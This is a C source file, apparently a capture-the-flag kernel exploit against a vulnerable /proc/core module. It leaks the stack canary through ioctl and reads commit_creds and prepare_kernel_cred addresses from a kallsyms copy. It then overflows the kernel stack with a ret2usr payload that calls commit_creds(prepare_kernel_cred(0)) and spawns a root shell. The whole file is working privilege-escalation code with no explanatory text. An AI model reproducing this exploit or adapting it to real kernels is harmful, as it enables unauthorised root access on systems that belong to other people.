#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<unistd.h>

unsigned long long commit_cred_addr;
unsigned long long prepare_kernel_cred_addr;
unsigned long long ret_addr;


void promote_root()
{

    int (*commit_cred)(struct cred *new);
    struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);

    commit_cred = commit_cred_addr;
    prepare_kernel_cred =  prepare_kernel_cred_addr;
    (*commit_cred)((*prepare_kernel_cred)(0));
    asm("mov %rbp,%rsp");//因为反汇编看出缺少部分内容
    asm("xor %rax,%rax");//设置返回值为0
    return;    
}

unsigned long long get_kernel_func_addr(char* cmd)
{
    char buf[64];
    memset(buf,0,sizeof(buf));
    FILE *fp = popen(cmd,"r");
    fgets(buf,sizeof(buf),fp);
    return strtoul(buf,NULL,16);
}
unsigned long long get_commit_cred_addr()
{
    char *cmd="cat /tmp/kallsyms |grep commit_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}
unsigned long long get_prepare_kernel_cred_addr()
{
    char *cmd="cat /tmp/kallsyms |grep prepare_kernel_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}

int main(int argc,char ** argv)
{
    int fd = open("/proc/core",O_RDWR);
    unsigned long long buf[64];

    unsigned int off_set_cmd = 0x6677889C;
    unsigned int read_cmd = 0x6677889B;
    unsigned int core_copy_func_cmd = 0x6677889A;

    //first setting off = 64
    int off = 64;
    ioctl(fd,off_set_cmd,64);

    //call read to leak canary
    ioctl(fd,read_cmd,buf);

    for (int i=0;i<64;i++)
    {
        printf("%016llx ",buf[i]);
    
    }
    printf("\n");
    unsigned long long canary = buf[0];
    ret_addr = buf[2];
    printf("get canay is:%016llx\n",canary);


    //set commit_cred and prepare_kernel_cred address
    commit_cred_addr = get_commit_cred_addr();
    prepare_kernel_cred_addr = get_prepare_kernel_cred_addr();
    printf("commit_cred:%016llx\n",commit_cred_addr);
    printf("prepare_kernel_cred:%016llx\n",prepare_kernel_cred_addr);
    //promote_root(commit_cred_addr,prepare_kernel_cred_addr);
    
    unsigned long long name_payload[11];
    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;//canary
    name_payload[10] = (&promote_root)+5;//rip
    printf("promote_root:%016llx\n",&promote_root);
    printf("promote_root+5:%016llx\n",name_payload[10]);
    printf("name_payload_len:%u\n",sizeof(name_payload));
    //set name
    write(fd,name_payload,sizeof(name_payload));
    
    //triger stack mash and excute shellcode to promote to root
    long long len = -65448;//unsigned short len =88
    ioctl(fd,core_copy_func_cmd,len);
    //we are root now
    system("/bin/sh");
    sleep(2);

    return 0;
}
